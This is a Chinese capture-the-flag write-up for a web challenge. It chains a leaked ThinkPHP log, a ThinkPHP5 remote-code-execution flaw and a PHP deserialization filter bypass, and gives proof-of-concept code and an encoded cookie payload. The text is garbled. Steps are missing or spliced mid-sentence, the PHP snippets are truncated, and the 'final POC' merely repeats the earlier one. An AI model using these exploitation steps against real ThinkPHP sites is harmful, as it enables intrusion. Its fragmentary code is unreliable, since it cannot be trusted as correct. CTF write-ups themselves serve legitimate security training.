### 10.easy_pentest（1000 points）
考点：tp框架特性，信息泄露，rce
解题步骤：
1.考点即题目的两个hint：
    Hint1:tp框架特性 
    Hint2:万物皆有其根本，3.x版本有，5.x也有，严格来说只能算信息泄露
2.测试发现，我们输入index.php等已知的tp文件，都会自动跳转回 **not_safe.html** ，我们首先要找到泄露信息的点，获得权限去访问
3.信息泄露，就想到了去查看tp日志
通过fuzz，发现 **runtime/log/201910/02.log** 存在信息泄露
4.发现一个关键的参数 **safe_key** ，然后根据上面写的头部再次访问
访问成功，跳转到了 **safe_page.html** ，并获取到了tp版本为 **5**
5.接下来，就是去找tp5是否存在已知爆出的远程rce的漏洞，参考：[ThinkPHP5漏洞分析之代码执行(十)](https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81)
6.漏洞点是tp5的 **method** 代码执行，漏洞触发点在 **call_user_func** 函数
7.直接拿payload打过去
8.成功执行，后面测试发现过滤了如下内容：
    file关键字
    php短标签：
    id, $session->username);**
返回结果数量不能小于4，即我们反序列化后对象的username和id字段拼接道Sql语句后必须有查询结果
（3）debug类的 **__construct** 魔术方法， **check1** 函数
检查对象的username字段是否为 **debuger** ，意思是我们查询的用户名必须是 **debuger** ， **check1** 函数同理
（4）最后输出`echo $this->forbidden`;
虽然前后矛盾，但是细看，第一个比较是`===`，而第二个比较 **switch** 则是弱类型比较即`==`，所以我们可以让 **$this->choose**为" **2** "，即可绕过过滤
11.综上，写出如下POC：
    forbidden = unserialize('O:5:"debug":4:{s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;}');
        }
    }
    $d = new debug();
    //echo serialize($d);
    echo cookie_encode(serialize($d));
    ?>
12.运行得到cookie的payload：
    &144&16a&15f&121&13f&159&13a&15b&14a&147&13a&121&14a&169&139&126&13e&15a&160&127&153&16a&15f&122&13f&159&13a&15a&151&137&129&166&153&122&145&159&13f&123&13d&126&13d&144&15f&159&13d&159&139&127&153&16a&15f&125&13f&159&13a&15d&152&123&13a&159&151&147&142&15b&14a&147&124&159&13f&120&128&126&13e&144&15f&159&14a&137&146&159&154&147&153&159&13f&15a&149&126&155&123&13d&126&13e&15a&15f&159&149&122&158&166&152&123&13e&15c&139&15a&164&16a&13f&15a&135&126&139&15a&139&159&13f&123&13d&126&13f&144&15f&159&14a&15d&129&169&149&15d&15c&15b&14a&137&146&165&139&15a&164&16a&13f&15a&131&126&139&159&139&127&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&131&126&139&159&139&127&153&16a&15f&169&13f&159&13a&166&149&159&139&127&144&15a&164&16a&13f&15a&139&126&139&15d&15c&15b&139&15a&164&160&13f&15a&139&127&153&16a&15f&124&13f&159&13a&121&153&122&146&169&152&15d&136&164&14a&143&139&127&153&16a&15f&123&13f&159&13a&15b&14a&147&13a&121&14a&122&146&169&139&15a&164&129&153&16a&15f&168&13d&15a&15f&159&149&147&13e&15a&14a&148&13e&16a&148&123&142&166&151&122&146&165&139&15a&164&16a&13f&15a&131&126&139&159&139&127&153&16a&15f&169&13f&159&13a&166&149&159&139&127&144&15a&164&16a&13f&15a&139&126&139&15d&15c&15b&139&15a&164&160&13f&15a&139&127&153&16a&15f&124&13f&159&13a&121&153&122&146&169&152&15d&136&164&14a&143&139&127&153&16a&15f&123&13f&159&13a&15b&14a&147&13a&121&14a&122&146&169&139&15a&164&129
13.传入后发现，此时已经成功包含 **flag.php** ，但是，提示了一段信息： **token error**
，并且告诉我们在flag.php中还包含了 **access.php** 猜想可能对应类中的 **access_token**
参数，但是因为是include，所以我们看不到flag.php的源码。这里也是卡了很久，后来才发现有备份文件： **access.php.bak**
    funny);
    } catch(Exception $e) {
        echo '';
    }
    ?>
14.那么，我们再添加一个参数 **$this- >funny**，反序列化后的 **access_token** 为 **3ecReK &key**即可
最终POC：
    forbidden = unserialize('O:5:"debug":4:{s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;}');
        }
    }
    $d = new debug();
    //echo serialize($d);
    echo cookie_encode(serialize($d));
    ?>